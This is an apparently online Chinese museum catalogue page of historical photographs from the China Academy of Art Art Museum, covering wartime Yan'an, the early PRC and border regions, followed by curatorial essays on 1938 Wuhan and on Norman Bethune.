<p>作品由中国美术学院美术馆收藏</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmIAIIF41AxtW5DU9BMmt2I2pTmA4FZtbfJFpQdVkP8TZzeTekgOicMog/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>1940 年冬 北岳区反“扫荡”战斗之一</strong></p>
<p>1940</p>
<p>沙飞</p>
<p>数字微喷 Inkjet Print</p>
<p>作品由中国美术学院美术馆收藏</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmcUNkCgslGFx9K8SlXlNEWc9WicwkrMzIsm7Y6Zatc4AB9gvu6HsmOuQ/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>1942 年晋察冀军区无线电技术高级训练班听林迈可讲课</strong></p>
<p>1942 Advanced radio training taught by Michael Lindsay in the Shanxi-Chahar-Hebei border region</p>
<p>1942</p>
<p>沙飞</p>
<p>数字微喷 Inkjet Print</p>
<p>作品由中国美术学院美术馆收藏</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmMDkLA8d9rparcYn8UexmJBb29YbibGBsCFxC1LRLNvuBicNzpdmTDfaA/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>1943 年 开门战术</strong></p>
<p>1943 Open door tactic</p>
<p>1943</p>
<p>流萤</p>
<p>数字微喷 Inkjet Print</p>
<p>作品由中国美术学院美术馆收藏</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmV5tQdhuXjHC9kXYgXG88ickfoSzR416o4L3Zdzz9db3CuHkVDC1x3Dw/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>1939 年 黄土岭 英勇卫士</strong></p>
<p>1939 Heroic defender at Huangtu Valley</p>
<p>1939</p>
<p>罗光达</p>
<p>数字微喷 Inkjet Print</p>
<p>作品由中国美术学院美术馆收藏</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmBEZxmKmB2XN8vKquAxhjRZROkYS4mx7fNe1y5lA8saZ9yjJv37nmng/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>1941 年 5 月 联大与抗大举行男子篮球比赛之二</strong></p>
<p>May 1941 Race at the first students’ sports competition in the Shanxi-Chahar-Hebei border region held on the banks of the Hutuo River, Pingshan County, Northern Hebei province</p>
<p>1941</p>
<p>沙飞</p>
<p>数字微喷 Inkjet Print</p>
<p>作品由中国美术学院美术馆收藏</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmr3xgcDnMWjh8xic5ENtH1y5a7b5BI6feByqgFnPIkbu6rAJoNIuHK5w/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>1939 年 5 月 陈波儿为军事操练的妇女自卫队拍照</strong></p>
<p>May 1939 Chen Boer taking photos of military exercises by the women’s self-defense troops 1939</p>
<p>1939</p>
<p>沙飞</p>
<p>数字微喷 Inkjet Print</p>
<p>作品由中国美术学院美术馆收藏</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmvH2ageTS0mV1KGzKF0lKCNGXTibASggibPFT2SVUDHW60CKibxGYibjbew/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>1940 年北岳民兵东调。平一区民兵射击训练，抗先队长社德贵在指点</strong></p>
<p>1940 Beiyue militia shooting practice overseen by vanguard leader Du Degui</p>
<p>1940</p>
<p>罗光达</p>
<p>数字微喷 Inkjet Print</p>
<p>作品由中国美术学院美术馆收藏</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmBHhLGBXiaqUOoTwhrCeNeWiawSY441rGYdSy8R5Kw70o1Y0qkQib7xQhg/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>小机枪手在战斗中成长</strong></p>
<p>Young riflemen in the making</p>
<p>年代未知</p>
<p>沙飞</p>
<p>数字微喷 Inkjet Print</p>
<p>作品由中国美术学院美术馆收藏</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxm9Z0QIyrygUftbTb9GRUBt2kzAdTynn33EEt4UyhVSicnS8Iwo0BNRiaQ/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>1940 年 百团大战，二团一连连长李永生在涞源三甲村战斗中，一人缴获敌人轻机枪 1 挺，三八式步枪 3 支</strong></p>
<p>1940 Hundred Regiments Offensive: Company commander Li Yongsheng during the battle for Sanjia Village with rifles seized from the enemy</p>
<p>1940</p>
<p>杨国治</p>
<p>数字微喷 Inkjet Print</p>
<p>作品由中国美术学院美术馆收藏</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmJyWHfuS8KzqXdGAZEXuTMb2e31iajI0ib6B03leibJ7jO61FEMu2ZcUrg/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>1943 年 滹沱河之夏：儿童团村口站岗</strong></p>
<p>1943 Hutuo River in summer: Children’s Corps Village guard</p>
<p>1943</p>
<p>李途</p>
<p>数字微喷 Inkjet Print</p>
<p>作品由中国美术学院美术馆收藏</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmwhMOJL6KwX6XTIbHeEuZuFXGHsKaOibMnQofbdLBNuK1zfcvTLEjK0w/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>1945 年 为八路军赶制军衣的张家口新华毛织厂女工</strong></p>
<p>1945 Female worker holding military uniforms made by the Xinhua Wool factory for the Eighth Route Army</p>
<p>1945</p>
<p>流萤</p>
<p>数字微喷 Inkjet Print</p>
<p>作品由中国美术学院美术馆收藏</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxm4T3qnxtLvlWo8TX7CYqbWHcnibOCzofZ0jSmiaaRoKtdusBc2ZqpjLyA/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>街头剧《放下你的鞭子》，抗敌剧社游击区宣传演出，由郑红羽、胡朋饰演</strong></p>
<p>1941, Street theater titled “Put Down Your Wip” performed by Zheng Hongyu and Hu Peng for guerilla fighters</p>
<p>1941</p>
<p>赵烈</p>
<p>作品由中国美术学院美术馆收藏</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmwoQ29xjXGrz2SZXRI22SQMOfC6NgP40ep7tncRHegGLZJtibmXumwRA/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>八路军护士 延安</strong></p>
<p>Yan’an (China), Eighth Route Army nurses</p>
<p>1944</p>
<p>哈里森·福尔曼</p>
<p>数字微喷 Inkjet Print</p>
<p>作品由中国美术学院美术馆收藏</p>
<p>购于威斯康星大学密尔沃基图书馆</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmOicMibs1AvL1Uq6kIiauQdZYzNDFxRcM7aekhicSQUibSicEFdJRw0eZoGuA/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>手拿地雷的民兵. 延安</strong></p>
<p>Yan’an (China). People’s Militia member holding land mines</p>
<p>1944</p>
<p>哈里森·福尔曼</p>
<p>数字微喷 Inkjet Print</p>
<p>作品由中国美术学院美术馆收藏</p>
<p>购于威斯康星大学密尔沃基图书馆</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmeetZjmhPtREOABp9esE5mWGicTNw9SacZXLEtE2U0C0cN4U7FksWkkg/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>妇女将一碗水递给八路军. 延安</strong></p>
<p>Yan’an (China), woman handing bowl of water to Eighth Route Army soldier</p>
<p>1944</p>
<p>哈里森·福尔曼</p>
<p>数字微喷 Inkjet Print</p>
<p>作品由中国美术学院美术馆收藏</p>
<p>购于威斯康星大学密尔沃基图书馆</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmm4lpQ3xK6SX7BLOicSc71yaQaWrBTePK94TVE69XKqGkGboe2x6CiaXw/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>民兵武装分子. 延安</strong></p>
<p>Yan’an (China), armed People’s Militia members</p>
<p>1944</p>
<p>哈里森·福尔曼</p>
<p>数字微喷 Inkjet Print</p>
<p>作品由中国美术学院美术馆收藏</p>
<p>购于威斯康星大学密尔沃基图书馆</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmk7ux7tLqn6k6OsIcmIcJnZ2rj0sAmgH3IZS4KGp6N3yJjPYSk6oxIw/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>《东方红》系列——第四幕埋葬蒋家王朝——欢庆解散，北京</strong></p>
<p>The East is Red series —— the fourth scene. The Burial of the Chiangs —— celebrating liberation. Beijing</p>
<p>1965</p>
<p>牛畏予</p>
<p>明胶银盐 Gelatin Silver Print</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxm3Dqch7AlBtLR27XapScyhEEsbI8YzJAtM5zkmibwApMz44c6mzglmDQ/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>“跟我走”，新疆</strong></p>
<p>“Follow me”，Xinjiang</p>
<p>1960</p>
<p>牛畏予</p>
<p>明胶银盐 Gelatin Silver Print</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmZpIXESYIlP03xLicvvHesFQ7hCvGyNAHEetIYxNCOL1XnN3JqWsXlTw/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>藏民与孩子，四川</strong></p>
<p>A Tibetan woman and her child, Sichuan</p>
<p>1960s</p>
<p>牛畏予</p>
<p>明胶银盐 Gelatin Silver Print</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxms3tjmYCHB4LoVBePW16kvUFscgoJ0R5ZrXNeiaYm2dDHkFdf3SLAGBw/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>西藏山南乃东县克松人民公社打麦场上</strong></p>
<p>In the wheat field of people’s commune  at Kesong, Naidong county, Shannan, Xizang</p>
<p>1975</p>
<p>牛畏予</p>
<p>明胶银盐 Gelatin Silver Print</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmHEaO9pkKNC5I5r6ZhCulV5JLc3NM5icXcvDfYcxzuuvkJcdyUmibHJiaA/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>女性 11：我国第一个女跳伞员</strong></p>
<p>Woman 11：China’s first female parachutist</p>
<p>1950s</p>
<p>牛畏予</p>
<p>作品由中国美术学院美术馆收藏</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxm4iaKTRlibls56C77LicSWuOaTA6mll8Fic5EE7ckiaWmtuTgPZumcYqrWjA/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>女性 15：壮族女民兵</strong></p>
<p>Woman 15：Zhuang militia women</p>
<p>1956</p>
<p>吴印咸</p>
<p>作品由中国美术学院美术馆收藏</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmibOy5OXNzqzGoCUOS3rO6hvPW1gvXWOaarEcibYSU30SHlaYOxvyaUxA/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>女性 9：红塔公社的女社员</strong></p>
<p>Woman 9：female members of Hongta Commune，Sichuan</p>
<p>1963</p>
<p>牛畏予</p>
<p>作品由中国美术学院美术馆收藏</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmkyJNCZiaMDwpRmkYnuhoqZLDTKk895heXic8VSkOdz3voeZ6yic390Wqg/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>边疆 18：姐弟</strong></p>
<p>Border 18：sister and brother，Yunnan</p>
<p>1957</p>
<p>牛畏予</p>
<p>作品由中国美术学院美术馆收藏</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmQEZ4J5NyOwLiauWE6jOYhVCgVK57hAj9VxtiaAFibDyuibGu9juyvsVfvw/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>边疆 19：打麦场上</strong></p>
<p>Border 19：on the threshing field，“Tawa”，Aba，Sichuan</p>
<p>1963</p>
<p>牛畏予</p>
<p>作品由中国美学院美术馆收藏</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmMBmRnFT4XP2esnWeHE5S34WsGZ1JkGgwEMFOTbUBnIX5YJG8NXB7uA/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>中共七大会场</strong></p>
<p>The 7th CPC National Congress</p>
<p>1945</p>
<p>吴印咸</p>
<p>作品由中国美术学院美术馆收藏</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmmgAWOkkoibeVOSqdiapUgFy1e94XcrQAlNCwTZxMHcFU3p4MZdxeicxRw/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>毛主席和朱总司令在中共七大会议上</strong></p>
<p>April 1945, Communist Party Chairman Mao Zedong and Commander-in-Chief Zhu De at the 7th CPC National Congress</p>
<p>1945 年 4 月</p>
<p>徐肖冰</p>
<p>作品由中国美术学院美术馆收藏</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmVxdHPoZWicUPYSaFbbPa9qOu5yIH3iaNH4UdUIFib570Px5ZpH2Xeh4Zg/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>1944 年 毛泽东在延安</strong></p>
<p>1944 Mao Zedong in Yan’an</p>
<p>1944</p>
<p>郑景康</p>
<p>数字微喷 Inkjet Print</p>
<p>作品由中国美术学院美术馆收藏</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmOpOgIVJXRlKp634BeoNx2PkiaRia4Oah5ReJYyVia0pOhqplvaXZdSNiaw/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>切断敌人通讯联络，此幅作品与展览于 1987 年的太行山大别山喜马拉雅山（三山）展览，作品信息沿用当时展签说明</strong></p>
<p>Cut off the enemy’s communication. This work was produced and exhibited at the Taihang Dabie Himalayas (Three Mountains) Exhibition 1987. The information of the works followed the instructions of the exhibition signs at that time.</p>
<p>1987</p>
<p>明胶银盐 Gelatin Silver Print</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmvprmJEJibxw1L2ELxz6Tic9cemaiaxOFEa9FIeLZJSXJxWG4xFzP41GDQ/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>1949 年 10 月 1 日，开国大典上，人民解放军装甲部队通过天安门接收检阅</strong></p>
<p>October 1, 1949, On the founding ceremony, panzer divisions of the people’s liberation army received inspection</p>
<p>1949</p>
<p>杨振亚</p>
<p>数字微喷 Inkjet Print</p>
<p>作品由中国美术学院美术馆收藏</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmtAzEBSCh0icTmbTML1evKQmECs9BiaET749f8kW642CIz2TIpdAbceMg/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>“国民党一团糟”</strong></p>
<p>“Kuomintang in a mess”</p>
<p>1949</p>
<p>高帆</p>
<p>数字微喷 Inkjet Print</p>
<p>作品由中国美术学院美术馆收藏</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmp8icmfT4ich2topjUjIwVOZTmBiaUmliaobwwNxtPnAiaZ1jicK9VpQ09maQ/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>北平市民在东长安街三座门看解放军战争形势图</strong></p>
<p>January 1949, Peiping citizens looked at the war situation map in Sanzuomen, East Changan Street</p>
<p>1949</p>
<p>高帆</p>
<p>明胶银盐 Gelatin Silver Print</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmFs5JZqibrrRJtdoGLPNYicuiaUg6Uo4GlLSiayxdSgcdyasUic4Wn4mPoUg/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>毛泽东投票</strong></p>
<p>Mao Zedong voted，Beijing</p>
<p>1950s </p>
<p>牛畏予</p>
<p>作品由中国美术学院美术馆收藏</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmoBE9axxTIIjlvtXicZgTsAg0icSpw1icPf0CkKONYhqTkATth40qia9NDw/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>唐克农场.四川阿贝若尔盖</strong></p>
<p>Tangke farm at Aba Ruoergai，Sichuan</p>
<p>1986</p>
<p>高帆</p>
<p>作品由中国美术学院美术馆收藏</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmm2GusXYmKLFLMwNGZppwROPAqBYick0u6pI0xjZ2gn5ZMIAP2nA2YSQ/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>丹江口水利枢纽大坝 1</strong></p>
<p>Danjiangkou hydraulic dam（1），Hubei</p>
<p>1976 年，湖北</p>
<p>牛畏予</p>
<p>作品由中国美术学院美术馆收藏</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxm4MxafC1ODjqMVpeGCCQUibluykCib8g9ty4XL8Jy9BuK8ibqaEVqBheZA/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>毛泽东和亚非拉朋友在一起 2</strong></p>
<p>Mao Zedong with friends from Asia，Africa and Latin Ameriaca，Beijing</p>
<p>1959</p>
<p>牛畏予</p>
<p>作品由中国美术学院美术馆收藏</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxm6WgyovBJmvVw5YWpKZ8b9ibmqlx9z794DibX4vyh5hRRPBCekkRQ51qA/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>《东方红》系列——指挥：秋里</strong></p>
<p>“The East is Red” series——conductor：Qiu Li，Beijing</p>
<p>1965</p>
<p>牛畏予</p>
<p>作品由中国美术学院美术馆收藏</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmquGfqodM3JB1jON25KAic4KIxlrGk4CXEoZ5g3mtvFPtZuXnIryx0xA/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>国庆游行</strong></p>
<p>1950-60s，Parade at the National Day，Beijing</p>
<p>1950-60 年代，北京</p>
<p>吴印咸</p>
<p>作品由中国美术学院美术馆收藏</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxm4n2fjm0tBlmIesOylDeHDAOdNfrcaEhSrcnF6vLsPaRBMsKjicaQuEQ/640?wx_fmt=jpeg" alt="img"></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmsX5ibuvGu3iaAEecDuzDzibj7M21p4rsAo6xGF11218rr3JH9AqwIrE1Q/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>1965 年国庆节，刘少奇主席在天安门主席台上</strong></p>
<p>October 1965，President Liu Shaoqi stood on the Tiananmen rostrum on the National day in 1965</p>
<p>1965 年 10 月 北京</p>
<p>袁苓</p>
<p>作品由中国美术学院美术馆收藏</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmeEkvM7mfVibWeLVdEALibyiaNiazMCibLH554eRaS8U1pbflibHTIY3VqibKw/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>“毛主席最新指示宣传组”</strong></p>
<p>“Chairman Mao‘s latest propaganda group”</p>
<p>1960-70s</p>
<p>刘峰 Liu Feng</p>
<p>作品由中国美术学院美术馆收藏</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmBS3fqR22hQCJsxBR6SF2TaWI5ia3MgFTSXOTlz0NnbLpM27BuZBEWuQ/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>宝塔山下</strong></p>
<p>Under Baota mountain</p>
<p>新中国时期 the New China period</p>
<p>吴印咸</p>
<p>作品由中国美术学院美术馆收藏</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmHfu4HrNqZznU6Fa0RLxa9y6R6hZ23NrAOcWnpbBCjRnc6Gr7G1iaviaA/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>出席军事活动的邓小平</strong></p>
<p>Deng Xiaoping at a military event</p>
<p>1984</p>
<p>高帆</p>
<p>作品由中国美术学院美术馆收藏</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmmnKqJribV51ThdIuicHia33RMm28MYHAQVRSXBwoIc834YvbwI7icsr2oQ/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>厦门鼓浪屿，拉小提琴的男孩</strong></p>
<p>Boy playing the violin on Gulangyu Island</p>
<p>1973</p>
<p>牛畏予</p>
<p>数字微喷 Inkjet Print</p>
<p>作品由中国美术学院美术馆收藏</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxm0JxR90MWAtUFy1FVVEnuibXCNgUdwvm1ibVibEQcXpOuWiacSrDJHrDCwA/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>勘探队队员在雪山里做早操</strong></p>
<p>Exploration team doing morning exercise on snow mountains</p>
<p>1975</p>
<p>牛畏予</p>
<p>明胶银盐 Gelatin Silver Print</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmcyvSsymIcE85b7H3gk6L425p8HEiauMkoa9PaeTdTl0Bbo5R4PUL2rA/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>国庆十周年，北京</strong></p>
<p>The decennial of National Day，Beijing</p>
<p>1959</p>
<p>牛畏予</p>
<p>数字微喷 Inkjet Print</p>
<p>作品由中国美术学院美术馆收藏</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxm0k3047UvTIa7FvGJkC1Nnzen8LhwTe37dic9QribetpXBLMkVapqVGPg/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>1959，北京，新建成的人民大会堂</strong></p>
<p>Newly-build Great Hall of People，Beijing</p>
<p>1959</p>
<p>牛畏予</p>
<p>数字微喷 Inkjet Print</p>
<p>作品由中国美术学院美术馆收藏</p>
<p><strong>1938 年的武汉：画笔、刻刀、歌声与摄影机</strong></p>
<p>文 &#x2F; 高初</p>
<p>这是一个围绕 1938 年的武汉的五年的研究和展览计划，是一份策展的提案。第一幕 “交错的世界，未完结的二十世纪”，讲述伴随难民而来到战时的武汉的艺术家的故事。第二幕将讨论艺术家们转移的方向，同时也折射着人生的不同境遇，走向延安的艺术家们与新中国美术史的开端，以及转移至重庆、香港的艺术家的于民国时期美术史的回响。第三幕是一部双城记，同时在武汉和马德里讨论 20 世纪的历史结构，艺术创造、国际主义和革命理想。</p>
<p><strong>离散 &#x2F; 码头 &#x2F; 双城</strong></p>
<p>大半个中国已经沦陷。数以千万的难民迁移而途经武汉。青年学生和艺术家在这一次大迁徙中，通过歌声和一个城市的展览场化解着绝望。这是在一个绝望的城市的一群人，在必败的迁徙中焕发新生的时刻。也是一个国家，一个民族重新凝聚的时刻。</p>
<p>曾在 1936 年聚集马德里的人，在 1938 年来到武汉，使得这座被称为 “东方马德里” 的城市，和前者共同写就这一时期历史的风暴眼和文化创作现场的双城记。“从马德里到武汉” 的征途上，尤里斯·伊文思继反映西班牙内战的《西班牙的土地》后拍摄了反映中国抗日战争的纪录片《四万万人民》，罗伯特·卡帕在西班牙前线拍出成名作《共和军战士之死》后将武汉一名 “保卫中国的战士送上了《生活》杂志的封面。除此之外，参加过西班牙内战的大卫·柯鲁克和诺尔曼·白求恩，以及包括安娜·路易斯·斯特朗、访问过延安的史沫特莱《纽约时报》记者蒂尔曼·德丁、《伦敦新闻纪事》记者阿特丽等人在内的众多国外记者，都于此时汇集于中国或武汉。国际人士的在场和参与，不但使得 1938 年的武汉成为了世界史研究中的重要节点，也在上述知名国际人士的生命史中留下了印记，“1938 年的中国 &#x2F; 武汉经历” 对这些自外部而来、此后又向外部四散开来的生命有着怎样的影响，“1938 年的中国&#x2F; 武汉” 是否经由对这些人的影响而在国际范围内散发着更加持久而深远的魅力，亦是值得探讨的问题。</p>
<p><strong>中国电影史和摄影史的关键篇章</strong></p>
<p>经周恩来的安排，荷兰导演尤里斯·伊文思在 1938 年武汉的某个夜晚将两台摄影机秘密地交给吴印咸，黑暗中看不清彼此的面孔，两人握了握手。这两台摄影机由吴印咸带到了延安，就是延安电影团的开始。与此同时，国民政府的官方通讯社中央社的重要记者俞创硕在武汉拍摄武汉会战，国民政府国际宣传处摄影室主任郑景康亦在武汉留下了大量作品，并因渐渐不满于国民党对于摄影的利用方式，而最终觉得前往延安。周恩来秘书的童小鹏 1938 年于武汉也拍摄的八路军办事处的不少照片。而抗战时期边区最为重要的几位摄影者，如石少华、高帆、吴群均是经由武汉前往延安，又到了战场前线从事摄影。</p>
<p><strong>均无留存</strong></p>
<p>如丁正献先生的女儿所回忆：“1938 年春，父亲刚从上海美专毕业，应恩师倪贻德之邀，赴武汉参加周恩来、郭沫若领导的政治部第三厅，从事抗日美术宣传工作。作了大量宣传画与油画。但均无留存。”</p>
<p>“均无留存”，正如黄鹤楼壁画一样，如何通过文献和这只言片语重新打开这一段美术史？或者说，倘若艺术家放下画笔，先去和市民们唱歌。他们的这段经历如何内化于之后创作之中？而1938 年的艺术家的构造能力，是否正在艺术创造之外，而恰在整体展演的媒介场之中。</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmqnsvT78u2jq6Yf5OQnf2VL4O90ibsBnRbUbH7RibvCibu9AIuc3EnD0Mg/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>1943 年 丰收</strong></p>
<p>1943 Bumper harvest</p>
<p>1943</p>
<p>郑景康</p>
<p>数字微喷 Inkjet Print</p>
<p>作品由中国美术学院美术馆收藏</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmLSTicmpLAnWlibLSFotm2LzuxrRN89l2luLPFnwYKCofMMLvlkXjGwRg/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>1943 年 打谷场上</strong></p>
<p>1943 Threshing floor</p>
<p>1943</p>
<p>郑景康</p>
<p>数字微喷 Inkjet Print</p>
<p>作品由中国美术学院美术馆收藏</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmGAjSSBecG5D0ibv4aZt7K6Y2C9piccKMBb1X4XiaYWeSRuaRr3V9T3uwQ/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>1938 年，毛泽东在抗日军政大学做《论持久战》报告</strong></p>
<p>Mao Zedong delivering a report titled “On Protracted War” at he Chinese People’s Anti-Japanese military and Political University. Yan’an.</p>
<p>1938</p>
<p>徐肖冰</p>
<p>数字微喷 Inkjet Print</p>
<p>作品由中国美术学院美术馆收藏</p>
<hr>
<p><strong>白求恩：从马德里到华北</strong></p>
<p><strong>三个中国摄影师所拍摄的白求恩</strong></p>
<p>文 &#x2F; 高初</p>
<p>本文刊于北京塞万提斯学院-西班牙文化中心和中国摄影文献联合主办的展览《白求恩：从西班牙到中国》（2018.12.13 - 2019.2.28）的前言。此次展览是白求恩三部曲中的开篇，聚焦于白求恩的生命史。</p>
<p>白求恩三部曲的第二幕是即将在中国美术学院美术馆举办的展览《白求恩：战士、医生与艺术家》。</p>
<p><strong>双城记：从 1936 年的马德里到 1938 年的武汉</strong></p>
<p>发生在欧洲的事件：政治与艺术，战争与伤痛，激荡的争论与个人的命运交织在一起。而在亚洲，苦难也早已成为艺术家最本能的经验。</p>
